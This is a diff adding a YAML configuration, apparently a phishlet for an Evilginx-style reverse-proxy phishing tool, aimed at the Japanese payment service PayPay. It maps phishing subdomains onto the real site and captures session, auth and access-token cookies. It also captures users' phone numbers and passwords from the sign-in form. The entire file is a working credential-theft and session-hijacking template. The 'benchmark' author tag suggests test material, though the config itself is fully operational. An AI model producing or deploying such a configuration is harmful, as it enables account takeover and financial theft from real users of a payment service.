@@ -1,0 +1,41 @@
+name: 'paypay'
+author: 'benchmark'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - phish_sub: 'www'
+    orig_sub: 'www'
+    domain: 'paypay.ne.jp'
+    session: true
+    is_landing: true
+  - phish_sub: 'cdn'
+    orig_sub: 'cdn.assets'
+    domain: 'paypay.ne.jp'
+    session: false
+  - phish_sub: 'static'
+    orig_sub: 'static'
+    domain: 'paypay.ne.jp'
+    session: false
+  - phish_sub: 'image'
+    orig_sub: 'image'
+    domain: 'paypay.ne.jp'
+    session: false
+
+auth_tokens:
+  - domain: '.paypay.ne.jp'
+    keys: ['session', 'sessionid', 'auth_token', 'access_token', 'token']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'phone'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.paypay.ne.jp'
+  path: '/portal/oauth2/sign-in'
